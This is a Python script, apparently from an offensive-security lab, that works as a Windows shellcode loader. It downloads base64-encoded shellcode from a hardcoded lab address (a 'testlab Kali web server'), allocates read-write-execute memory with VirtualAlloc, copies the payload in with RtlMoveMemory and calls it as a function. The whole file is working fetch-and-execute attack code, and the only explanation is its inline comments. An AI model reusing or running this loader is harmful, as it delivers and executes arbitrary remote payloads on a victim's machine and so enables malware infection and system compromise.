from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kernel32


def get_code(url):
	with request.urlopen(url) as response:
		shellcode = base64.decodebytes(response.read())
	return shellcode


def write_memory(buffer):
	# Allocate memory for 32- or 64-bit Python
	length = len(buffer)
	kernel32.VirtualAlloc.restype = ctypes.c_void_p

	# Move the buffer containing the shellcode into allocated memory
	kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

	# The 0x40 parameter specifies permissions to execute and read/write access;
	pointer = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
	kernel32.RtlMoveMemory(pointer, buffer, length)
	return pointer


def run(shellcode):
	# Allocate a buffer to hold the shellcode after decoding
	buffer = ctypes.create_string_buffer(shellcode)

	# Write the buffer into memory
	pointer = write_memory(buffer)

	# Cast the buffer to act like a function pointer
	shell_func = ctypes.cast(pointer, ctypes.CFUNCTYPE(None))

	# Call the function pointer to execute the shellcode
	shell_func()


if __name__ == '__main__':
	# Retrieve the base64-encoded shellcode from testlab Kali web server
	server_url = "http://192.168.122.108:8100/shellcode.bin"
	code = get_code(server_url)

	# Write the shellcode into memory and execute it
	run(code)
